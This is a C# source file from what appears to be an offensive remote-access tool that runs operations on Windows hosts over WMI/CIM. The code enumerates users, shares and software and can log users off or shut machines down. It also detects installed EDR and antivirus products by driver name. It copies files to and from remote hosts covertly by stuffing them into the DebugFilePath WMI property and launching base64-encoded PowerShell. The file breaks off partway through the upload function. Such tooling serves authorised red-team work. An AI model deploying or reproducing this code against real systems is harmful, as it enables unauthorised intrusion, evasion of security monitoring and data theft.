using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Remoting;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Reflection;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using ConsoleTables;
using Microsoft.Management.Infrastructure;
using Microsoft.Management.Infrastructure.Options;
using Models.CIM;

namespace ServiceLayer.CIM
{
    public class ExecuteCim
    {
        private static readonly Random Random = new Random();
        private static readonly string DefaultNameSpace = "root\\cimv2";
        #region System

        public object basic_info(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            const string osQuery = "SELECT * FROM Win32_OperatingSystem";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            foreach (var cimObject in queryInstance)
            {

                Messenger.Info("{0,-20}: {1,-10}", "Computer Name", cimObject.CimInstanceProperties["csname"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Windows Directory", cimObject.CimInstanceProperties["WindowsDirectory"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Operating System", cimObject.CimInstanceProperties["Caption"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Version", cimObject.CimInstanceProperties["Version"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Architecture", cimObject.CimInstanceProperties["OSArchitecture"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Build Number", cimObject.CimInstanceProperties["BuildNumber"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Build Type", cimObject.CimInstanceProperties["BuildType"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Serial Number", cimObject.CimInstanceProperties["SerialNumber"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Number of Users", cimObject.CimInstanceProperties["NumberOfUsers"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Registered User", cimObject.CimInstanceProperties["RegisteredUser"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Manufacturer", cimObject.CimInstanceProperties["Manufacturer"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Current TimeZone", cimObject.CimInstanceProperties["CurrentTimeZone"].Value);
                Messenger.Info("{0,-20}: {1,-10}", "Local DateTime", cimObject.CimInstanceProperties["LocalDateTime"].Value);
            }
            return queryInstance;
        }

        public object active_users(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var users = new List<string>();

            const string osQuery = "SELECT LogonId FROM Win32_LogonSession Where LogonType=2";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            foreach (var cimObject in queryInstance)
            {

                var lQuery = "Associators of {Win32_LogonSession.LogonId=" + cimObject.CimInstanceProperties["LogonId"].Value + "} Where AssocClass=Win32_LoggedOnUser Role=Dependent";
                var subQuery = cimSession.QueryInstances(planter.NameSpace, "WQL", lQuery);

                foreach (var lCimObject in subQuery)
                {
                    //Grab the username and domain associated
                    users.Add(lCimObject.CimInstanceProperties["Domain"].Value + "\\" + lCimObject.CimInstanceProperties["Name"].Value);
                }
            }

            Messenger.Info("{0,-15}", "Active Users");
            Messenger.Info("{0,-15}", "------------");
            var distinctUsers = users.Distinct().ToList();
            foreach (var user in distinctUsers)
                Messenger.Info("{0,-25}", user);

            return queryInstance;
        }

        public object drive_list(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            var osQuery = "SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3 OR DriveType = 4 OR DriveType = 2";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            Messenger.Info("{0,-15}", "Drive List");
            Messenger.Info("{0,-15}", "----------");

            foreach (var cimObject in queryInstance)
                Messenger.Info("{0,-15}", cimObject.CimInstanceProperties["DeviceID"].Value);

            return queryInstance;
        }

        public static object share_list(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            const string osQuery = "SELECT * FROM  win32_share";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            Messenger.Info("{0,-20}{1,-20}{2,-20}", "Name", "Caption", "Path");
            Messenger.Info("{0,-20}{1,-20}{2,-20}", "-----------", "-----------", "-------");

            foreach (var cimObject in queryInstance)
            {
                Messenger.Info("{0,-20}{1,-20}{2,-20}", cimObject.CimInstanceProperties["Name"].Value.ToString(), cimObject.CimInstanceProperties["Caption"].Value.ToString(), cimObject.CimInstanceProperties["Path"].Value.ToString());
            }

            return queryInstance;
        }


        public object ifconfig(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var osQuery = "SELECT * FROM Win32_NetworkAdapterConfiguration";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            foreach (var cimObject in queryInstance)
            {
                if (!IsNullOrEmpty((string[])cimObject.CimInstanceProperties["IPAddress"].Value))
                {
                    var defaultGateway = (string[])(cimObject.CimInstanceProperties["DefaultIPGateway"].Value);
                    try
                    {
                        var dnsServersObj = cimObject.CimInstanceProperties["DNSServerSearchOrder"].Value;
                        var dnsServers = string.Empty;
                        if (dnsServersObj is IEnumerable enumerable)
                        {
                            foreach (var element in enumerable)
                            {
                                dnsServers += $"{element}, ";
                            }

                            dnsServers = dnsServers.TrimEnd(' ');
                            dnsServers = dnsServers.TrimEnd(',');
                        }

                        Messenger.Info("{0,-20}: {1,-10}", "DHCP Enabled", cimObject.CimInstanceProperties["DHCPEnabled"].Value);
                        Messenger.Info("{0,-20}: {1,-10}", "DNS Hostname", cimObject.CimInstanceProperties["DNSHostName"].Value);
                        Messenger.Info("{0,-20}: {1,-10}", "DNS Servers", dnsServers);
                        Messenger.Info("{0,-20}: {1,-10}", "Service Name", cimObject.CimInstanceProperties["ServiceName"].Value);
                        Messenger.Info("{0,-20}: {1,-10}", "Description", cimObject.CimInstanceProperties["Description"].Value);
                        Messenger.Info("{0,-20}: {1,-10}", "Default Gateway", defaultGateway[0]);
                        Messenger.Info("{0,-20}: {1,-10}", "MAC Address", cimObject.CimInstanceProperties["MACAddress"].Value);
                    }
                    catch
                    {
                        //pass
                    }

                    foreach (var i in (string[])cimObject.CimInstanceProperties["IPAddress"].Value)
                    {
                        if (IPAddress.TryParse(i, out var address))
                        {
                            switch (address.AddressFamily)
                            {
                                case System.Net.Sockets.AddressFamily.InterNetwork:
                                    Messenger.Info("{0,-20}: {1,-10}", "IP Address", address);
                                    break;
                            }
                        }
                    }
                }
            }
            return queryInstance;
        }


        /// <summary>
        /// Returns installed programs, x86
        /// </summary>
        /// <param name="planter"></param>
        /// <returns></returns>
        public object installed_programs(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            const string osQuery = "SELECT * FROM  Win32_Product";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            Messenger.Info("{0,-45}{1,-30}{2,20}{3,30}", "Application", "InstallDate", "Version", "Vendor");
            Messenger.Info("{0,-45}{1,-30}{2,20}{3,30}", "-----------", "-----------", "-------", "------");

            foreach (var product in queryInstance)
            {
                var name = "";

                if (string.IsNullOrEmpty(product?.CimInstanceProperties["Name"]?.ToString()))
                    continue;

                try
                {
                    name = product.CimInstanceProperties["Name"].Value?.ToString();
                }
                catch
                {
                    //pass
                }

                if (string.IsNullOrEmpty(name))
                    continue;

                if (name.Length > 35)
                {
                    name = Truncate(name, 35) + "...";
                }

                try
                {
                    Messenger.Info("{0,-45}{1,-30}{2,20}{3,30}", name,
                        DateTime.ParseExact(product.CimInstanceProperties["InstallDate"].Value.ToString(),
                            "yyyyMMdd", null), product.CimInstanceProperties["Version"].Value,
                        product.CimInstanceProperties["Vendor"].Value);
                }
                catch
                {
                    //value probably doesn't exist, so just pass
                }
            }

            return queryInstance;
        }

        public object Win32Shutdown(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var command = planter.Commander.Command;

            // This handles logoff, reboot/restart, and shutdown/poweroff
            const string osQuery = "SELECT * FROM Win32_OperatingSystem";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            var cimParams = new CimMethodParametersCollection();

            switch (command)
            {
                case "logoff":
                case "logout":
                    cimParams.Add(CimMethodParameter.Create("Flags", 4, CimFlags.In));
                    break;
                case "reboot":
                case "restart":
                    cimParams.Add(CimMethodParameter.Create("Flags", 6, CimFlags.In));
                    break;
                case "power_off":
                case "shutdown":
                    cimParams.Add(CimMethodParameter.Create("Flags", 5, CimFlags.In));
                    break;
            }

            // There's only one instance, so just grab the first one
            var nameResults = cimSession.InvokeMethod(queryInstance.First(), "Win32Shutdown", cimParams);

            
            var p = -1;
            if (nameResults != null)
            {
                int.TryParse(nameResults.ReturnValue.Value?.ToString(), out p);
            }

            if (p == 0)
                Messenger.GoodMessage(p.ToString());
            else
                Messenger.RedMessage(p.ToString());


            return nameResults;
        }

        public object vacant_system(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var system = planter.System;

            var allProcs = new List<string>();
            const string osQuery = "SELECT * FROM Win32_Process";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", osQuery);

            foreach (var cimObject in queryInstance)
            {
                allProcs.Add(cimObject.CimInstanceProperties["Caption"].Value.ToString());
            }

            // If screen saver or logon screen on
            if (allProcs.FirstOrDefault(s => s.Contains(".scr")) != null |
                allProcs.FirstOrDefault(s => s.Contains("LogonUI.exe")) != null)
            {
                Messenger.Info("Screensaver or Logon screen is active on " + system);
            }

            else
            {
                // Get active users on the system
                var users = new List<string>();
                const string newQuery = "SELECT LogonId FROM Win32_LogonSession Where LogonType=2";
                var activeQueryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", newQuery);

                foreach (var cimObject in activeQueryInstance)
                {
                    var lQuery = "Associators of {Win32_LogonSession.LogonId=" +
                                 cimObject.CimInstanceProperties["LogonId"].Value +
                                 "} Where AssocClass=Win32_LoggedOnUser Role=Dependent";

                    var activeSubQueryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", lQuery);

                    foreach (var subCimObject in activeSubQueryInstance)
                    {
                        users.Add(subCimObject.CimInstanceProperties["Name"].Value.ToString());
                    }
                }

                Messenger.YellowMessage("[-] System not vacant\n");
                Messenger.Info("{0,-15}", "Active Users on " + system);
                Messenger.Info("{0,-15}", "--------------------------------");

                var distinctUsers = users.Distinct().ToList();
                foreach (var user in distinctUsers)
                    Messenger.Info("{0,-15}", user);
            }

            return queryInstance;
        }


        // Idea and some code thanks to Harley - https://github.com/harleyQu1nn/AggressorScripts/blob/master/EDR.cna
        public object edr_query(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var activeEdr = false;

            var fileQuery = @"SELECT * FROM CIM_DataFile WHERE Path = '\\windows\\System32\\drivers\\'";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", fileQuery);

            foreach (var cimObject in queryInstance)
            {
                var fileName = Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString());

                switch (fileName)
                {
                    case "FeKern.sys":
                    case "WFP_MRT.sys":
                        Messenger.RedMessage("FireEye Found!");
                        activeEdr = true;
                        break;

                    case "eaw.sys":
                        Messenger.RedMessage("Raytheon Cyber Solutions Found!");
                        activeEdr = true;
                        break;

                    case "rvsavd.sys":
                        Messenger.RedMessage("CJSC Returnil Software Found!");
                        activeEdr = true;
                        break;

                    case "dgdmk.sys":
                        Messenger.RedMessage("Verdasys Inc. Found!");
                        activeEdr = true;
                        break;

                    case "atrsdfw.sys":
                        Messenger.RedMessage("Altiris (Symantec) Found!");
                        activeEdr = true;
                        break;

                    case "mbamwatchdog.sys":
                        Messenger.RedMessage("Malwarebytes Found!");
                        activeEdr = true;
                        break;

                    case "edevmon.sys":
                    case "ehdrv.sys":
                        Messenger.RedMessage("ESET Found!");
                        activeEdr = true;
                        break;

                    case "SentinelMonitor.sys":
                        Messenger.RedMessage("SentinelOne Found!");
                        activeEdr = true;
                        break;

                    case "edrsensor.sys":
                    case "hbflt.sys":
                    case "bdsvm.sys":
                    case "gzflt.sys":
                    case "bddevflt.sys":
                    case "AVCKF.SYS":
                    case "Atc.sys":
                    case "AVC3.SYS":
                    case "TRUFOS.SYS":
                    case "BDSandBox.sys":
                        Messenger.RedMessage("BitDefender Found!");
                        activeEdr = true;
                        break;

                    case "HexisFSMonitor.sys":
                        Messenger.RedMessage("Hexis Cyber Solutions Found!");
                        activeEdr = true;
                        break;

                    case "CyOptics.sys":
                    case "CyProtectDrv32.sys":
                    case "CyProtectDrv64.sys":
                        Messenger.RedMessage("Cylance Inc. Found!");
                        activeEdr = true;
                        break;

                    case "aswSP.sys":
                        Messenger.RedMessage("Avast Found!");
                        activeEdr = true;
                        break;

                    case "mfeaskm.sys":
                    case "mfencfilter.sys":
                    case "epdrv.sys":
                    case "mfencoas.sys":
                    case "mfehidk.sys":
                    case "swin.sys":
                    case "hdlpflt.sys":
                    case "mfprom.sys":
                    case "MfeEEFF.sys":
                        Messenger.RedMessage("McAfee Found!");
                        activeEdr = true;
                        break;

                    case "groundling32.sys":
                    case "groundling64.sys":
                        Messenger.RedMessage("Dell Secureworks Found!");
                        activeEdr = true;
                        break;

                    case "avgtpx86.sys":
                    case "avgtpx64.sys":
                        Messenger.RedMessage("AVG Technologies Found!");
                        activeEdr = true;
                        break;

                    case "pgpwdefs.sys":
                    case "GEProtection.sys":
                    case "diflt.sys":
                    case "sysMon.sys":
                    case "ssrfsf.sys":
                    case "emxdrv2.sys":
                    case "reghook.sys":
                    case "spbbcdrv.sys":
                    case "bhdrvx86.sys":
                    case "bhdrvx64.sys":
                    case "SISIPSFileFilter.sys":
                    case "symevent.sys":
                    case "vxfsrep.sys":
                    case "VirtFile.sys":
                    case "SymAFR.sys":
                    case "symefasi.sys":
                    case "symefa.sys":
                    case "symefa64.sys":
                    case "SymHsm.sys":
                    case "evmf.sys":
                    case "GEFCMP.sys":
                    case "VFSEnc.sys":
                    case "pgpfs.sys":
                    case "fencry.sys":
                    case "symrg.sys":
                        Messenger.RedMessage("Symantec Found!");
                        activeEdr = true;
                        break;

                    case "SAFE-Agent.sys":
                        Messenger.RedMessage("SAFE-Cyberdefense Found!");
                        activeEdr = true;
                        break;

                    case "CybKernelTracker.sys":
                        Messenger.RedMessage("CyberArk Software Found!");
                        activeEdr = true;
                        break;

                    case "klifks.sys":
                    case "klifaa.sys":
                    case "Klifsm.sys":
                        Messenger.RedMessage("Kaspersky Found!");
                        activeEdr = true;
                        break;

                    case "SAVOnAccess.sys":
                    case "savonaccess.sys":
                    case "sld.sys":
                        Messenger.RedMessage("Sophos Found!");
                        activeEdr = true;
                        break;

                    case "ssfmonm.sys":
                        Messenger.RedMessage("Webroot Software, Inc. Found!");
                        activeEdr = true;
                        break;

                    case "CarbonBlackK.sys":
                    case "carbonblackk.sys":
                    case "Parity.sys":
                    case "cbk7.sys":
                    case "cbstream.sys":
                        Messenger.RedMessage("Carbon Black Found!");
                        activeEdr = true;
                        break;

                    case "CRExecPrev.sys":
                        Messenger.RedMessage("Cybereason Found!");
                        activeEdr = true;
                        break;

                    case "im.sys":
                    case "CSAgent.sys":
                    case "CSBoot.sys":
                    case "CSDeviceControl.sys":
                    case "cspcm2.sys":
                        Messenger.RedMessage("CrowdStrike Found!");
                        activeEdr = true;
                        break;

                    case "cfrmd.sys":
                    case "cmdccav.sys":
                    case "cmdguard.sys":
                    case "CmdMnEfs.sys":
                    case "MyDLPMF.sys":
                        Messenger.RedMessage("Comodo Security Solutions Found!");
                        activeEdr = true;
                        break;

                    case "PSINPROC.SYS":
                    case "PSINFILE.SYS":
                    case "amfsm.sys":
                    case "amm8660.sys":
                    case "amm6460.sys":
                        Messenger.RedMessage("Panda Security Found!");
                        activeEdr = true;
                        break;

                    case "fsgk.sys":
                    case "fsatp.sys":
                    case "fshs.sys":
                        Messenger.RedMessage("F-Secure Found!");
                        activeEdr = true;
                        break;

                    case "esensor.sys":
                        Messenger.RedMessage("Endgame Found!");
                        activeEdr = true;
                        break;

                    case "csacentr.sys":
                    case "csaenh.sys":
                    case "csareg.sys":
                    case "csascr.sys":
                    case "csaav.sys":
                    case "csaam.sys":
                        Messenger.RedMessage("Cisco Found!");
                        activeEdr = true;
                        break;

                    case "TMUMS.sys":
                    case "hfileflt.sys":
                    case "TMUMH.sys":
                    case "AcDriver.sys":
                    case "SakFile.sys":
                    case "SakMFile.sys":
                    case "fileflt.sys":
                    case "TmEsFlt.sys":
                    case "tmevtmgr.sys":
                    case "TmFileEncDmk.sys":
                        Messenger.RedMessage("Trend Micro Inc Found!");
                        activeEdr = true;
                        break;

                    case "epregflt.sys":
                    case "medlpflt.sys":
                    case "dsfa.sys":
                    case "cposfw.sys":
                        Messenger.RedMessage("Check Point Software Technologies Found!");
                        activeEdr = true;
                        break;

                    case "psepfilter.sys":
                    case "cve.sys":
                        Messenger.RedMessage("Absolute Found!");
                        activeEdr = true;
                        break;

                    case "brfilter.sys":
                        Messenger.RedMessage("Bromium Found!");
                        activeEdr = true;
                        break;

                    case "LRAgentMF.sys":
                        Messenger.RedMessage("LogRhythm Found!");
                        activeEdr = true;
                        break;

                    case "libwamf.sys":
                        Messenger.RedMessage("OPSWAT Inc Found!");
                        activeEdr = true;
                        break;
                }
            }

            if (!activeEdr)
                Messenger.Info("No EDR vendors found, tread carefully");

            return true;
        }

        #endregion


        #region FILE OPERATIONS

        public object cat(Planter planter)
        {
            // Modified cat method from https://github.com/kyleavery/WMIEnum/blob/656666d00f6fd6fdfb67f398d83f27b6e28db7bf/WMIEnum/Program.cs#L186
            // Thanks to https://twitter.com/kyleavery_

            var cimSession = planter.Connector.ConnectedCimSession;
            var path = planter.Commander.File;

            // Check for file first
            if (!CheckForFile(path, cimSession, verbose: false))
            {
                Messenger.RedMessage("Remote file does not exist, please specify a file present on the system");
                return null;
            }

            Messenger.GoodMessage("[+] Printing file: " + path);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            // https://twitter.com/mattifestation/status/1220713684756049921
            var baseInstance = new CimInstance("PS_ModuleFile");
            baseInstance.CimInstanceProperties.Add(CimProperty.Create("InstanceID", path, CimFlags.Key));
            var modifiedInstance = cimSession.GetInstance("ROOT/Microsoft/Windows/Powershellv3", baseInstance);

            var fileBytes = (byte[])modifiedInstance.CimInstanceProperties["FileData"].Value;
            var s = Encoding.UTF8.GetString(fileBytes, 0, fileBytes.Length).TrimStart('\0').TrimStart('\t');
            Messenger.Info(Convert.ToString(s));
            return true;
        }

        public object copy(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var startPath = planter.Commander.File;
            var endPath = planter.Commander.FileTo;

            if (!CheckForFile(startPath, cimSession, verbose: true))
            {
                //Make sure the file actually exists before doing any more work. I hate doing work with no goal
                return null;
            }
            if (CheckForFile(endPath, cimSession, verbose: false))
            {
                //Won't work if the resulting file exists
                Messenger.RedMessage("[-] Specified copy to file exists, please specify a file to copy to on the remote system that does not exist");
                return null;
            }

            Messenger.GoodMessage("[+] Copying file: " + startPath + " to " + endPath);
            var newPath = startPath.Replace("\\", "\\\\");
            var newEndPath = endPath.Replace("\\", "\\\\");

            var query = $"SELECT * FROM CIM_DataFile Where Name='{newPath}' ";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", query);

            foreach (var cimObject in queryInstance)
            {
                // Set in-parameters for the method
                var cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("FileName", newEndPath, CimFlags.In)
                };

                // We only need the first (and only) instance
                cimSession.InvokeMethod(cimObject, "Copy", cimParams);
            }
            return queryInstance;
        }

        public object download(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var downloadPath = planter.Commander.File;
            var writePath = planter.Commander.FileTo;

            if (!CheckForFile(downloadPath, cimSession, verbose: true))
            {
                //Messenger.RedMessage("[-] Specified file does not exist, not running PS runspace\n");
                return null;
            }

            if (!planter.Commander.NoPS)
            {
                var originalWmiProperty = GetOsRecovery(cimSession);
                var wsman = true;
                var resetEnvSize = false;
                var originalRemoteEnvSize = EnvelopeSize.GetMaxEnvelopeSize(cimSession);
                var originalLocalEnvSize = EnvelopeSize.GetLocalMaxEnvelopeSize();

                // Get the local maxEnvelopeSize. If it's not set (default) let's note that
                originalRemoteEnvSize = originalRemoteEnvSize == "0" ? "500" : originalRemoteEnvSize;
                originalLocalEnvSize = originalLocalEnvSize == "0" ? "500" : originalLocalEnvSize;

                Messenger.GoodMessage("[+] Downloading file: " + downloadPath + "\n");

                if (wsman == true)
                {
                    var fileSize = GetFileSize(downloadPath, cimSession);

                    // We can modify this later easily to pass wsman if needed
                    using (var powershell = PowerShell.Create())
                    {
                        try
                        {
                            powershell.Runspace = !string.IsNullOrEmpty(planter.Password?.ToString()) ? RunspaceCreate(planter) : RunspaceCreateLocal();

                            if (fileSize / 1024 > 450)
                            {
                                resetEnvSize = true;
                                Messenger.YellowMessage(
                                    "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                                var envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                                EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                                EnvelopeSize.SetMaxEnvelopeSize(envSize.ToString(), cimSession);
                            }

                            var command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
                                           "'";
                            const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
                            const string command3 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                            if (powershell.Runspace.ConnectionInfo != null)
                            {
                                powershell.Commands.AddScript(command1, false);
                                powershell.Commands.AddScript(command2, false);
                                powershell.Commands.AddScript(command3, false);
                                powershell.Invoke();


                            }
                            else
                                wsman = false;
                        }
                        catch (PSRemotingTransportException)
                        {
                            wsman = false;
                        }
                    }
                }

                if (wsman == false)
                {
                    // WSMAN not enabled on the remote system, use another method

                    // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
                    var fileSize = GetFileSize(downloadPath, cimSession);

                    if (fileSize / 1024 > 450)
                    {
                        resetEnvSize = true;
                        var envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                        Messenger.YellowMessage(
                            "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                        if (fileSize / 1024 > 250000)
                        {
                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                            EnvelopeSize.SetMaxEnvelopeSize("999999999",
                                cimSession); // This is the largest value we can set, so not sure if this will work
                        }
                        else
                        {
                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                            EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
                        }
                    }

                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
                    var cimParams = new CimMethodParametersCollection();

                    var encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
                                         "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                    var fullCommand = "powershell -enc " + encodedCommandB64;

                    cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));

                    // We only need the first instance
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);
                }

                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);
                Messenger.YellowMessage("\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");

                //string[] fileOutput = CheckForFinishedDebugFilePath(originalWMIProperty, cimSession).Split(',');
                var fileOutput = CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                // We need to pause for a bit here for some reason
                Thread.Sleep(5000);

                //Create list for bytes
                var outputList = new List<byte>();

                //Convert from int (bytes) to byte
                if (fileOutput != null)
                {
                    foreach (var integer in fileOutput.Split(','))
                    {
                        try
                        {
                            var a = (byte)Convert.ToInt32(integer);
                            outputList.Add(a);
                        }
                        catch
                        {
                            //pass
                        }
                    }

                    //Save to local dir if no directory specified
                    if (string.IsNullOrEmpty(writePath))
                        writePath = Path.GetFileName(downloadPath);

                    File.WriteAllBytes(writePath, outputList.ToArray());
                }

                SetOsRecovery(cimSession, originalWmiProperty);

                if (resetEnvSize)
                {
                    // Set the maxEnvelopeSizeKB back to the default val if we set it previously
                    EnvelopeSize.SetLocalMaxEnvelopeSize(Convert.ToInt32(originalLocalEnvSize));
                    EnvelopeSize.SetMaxEnvelopeSize(originalRemoteEnvSize, cimSession);
                }
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            }

            return true;
        }

        public object ls(Planter planter)
        {
            var path = planter.Commander.Directory;
            Messenger.GoodMessage("[+] Listing directory: " + path + "\n");
            
            ls_file(planter, true);
            return ls_dir(planter, true);
        }

        public object search(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var path = planter.Commander.Directory;
            var file = planter.Commander.File;

            ///////// Will probably have to add more tests in here in case the user decides to do some funny business ///////////
            var drive = path.Substring(0, 2);
            string fileName;

            Messenger.GoodMessage($"[+] Searching for file like '{file}' within directory {path} \n");
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }
            var newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            //Build it vs sending in ObjectQuery so we can modify it accordingly (add extension qualifier and whatnot)
            var queryString = $"SELECT * FROM CIM_DataFile WHERE Drive='{drive}'";

            //Check to see if the user want's to search the whole drive (will be slowww)
            if (newPath == "\\\\")
            {
                //do nothing
            }
            else
                queryString += $" AND Path='{newPath}'";

            //Parse the file so we can modify the search accordingly
            if (!string.IsNullOrEmpty(Path.GetExtension(file)))
            {
                var extension = Path.GetExtension(file);
                extension = extension.Remove(0, 1); //remove the dot from the extension
                fileName = Path.GetFileNameWithoutExtension(file);
                queryString += $" AND Extension='{extension}'";
            }
            else
                fileName = file;

            //Parse for * sent in filename
            if (fileName.Contains("*"))
                fileName = fileName.Replace("*", "%");

            if (!string.IsNullOrEmpty(fileName))
                queryString += $" AND FileName LIKE '{fileName}'";

            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", queryString);

            foreach (var cimObject in queryInstance)
            {
                // Write all files to screen
                Messenger.Info("{0}", Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString()));
            }

            return queryInstance;
        }

        public object upload(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var writePath = planter.Commander.FileTo;
            var uploadFile = planter.Commander.File;

            if (!File.Exists(uploadFile))
            {
                Messenger.RedMessage("[-] Specified local file does not exist, not running PS runspace\n");
                return null;
            }

            if (!planter.Commander.NoPS)
            {
                var originalWmiProperty = GetOsRecovery(cimSession);
                var wsman = true;
                var resetEnvSize = false;
                var envSize = 500;

                Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
                Messenger.GoodMessage("--------------------------------------------------------------------\n");

                // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
                var fileSize = (int)new FileInfo(uploadFile).Length; //Value in KB

                if (fileSize / 1024 > 450)
                {
                    resetEnvSize = true;
                    envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                    Messenger.YellowMessage(
                        "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                    if (fileSize / 1024 > 250000)
                    {
                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                        EnvelopeSize.SetMaxEnvelopeSize("999999999",
                            cimSession); // This is the largest value we can set, so not sure if this will work
                    }
                    else
                    {
                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                        EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
                    }
                }

                var intList = new List<int>();
                var uploadFileBytes = File.ReadAllBytes(uploadFile);

                //Convert from byte to int (bytes)
                foreach (var uploadByte in uploadFileBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(cimSession, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                Messenger.YellowMessage(
                    "\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
                System.Threading.Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                if (wsman == true)
                {
                    // We can modify this later easily to pass wsman if needed
                    using (var powershell = PowerShell.Create())
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                                powershell.Runspace = RunspaceCreate(planter);
                            else
                                powershell.Runspace = RunspaceCreateLocal();

                            const string command1 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
                            const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
                            var command3 =
                                @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                                writePath + "' -Value $decoded";

                            if (powershell.Runspace.ConnectionInfo != null)
                            {
                                powershell.Commands.AddScript(command1, false);
                                powershell.Commands.AddScript(command2, false);
                                powershell.Commands.AddScript(command3, false);
                                powershell.Invoke();
                            }
                            else
                                wsman = false;
                        }
                        catch (PSRemotingTransportException)
                        {
                            wsman = false;
                        }
                    }
                }

                if (wsman == false)
                {
                    // WSMAN not enabled on the remote system, use another method

                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
                    var cimParams = new CimMethodParametersCollection();

                    var encodedCommand =
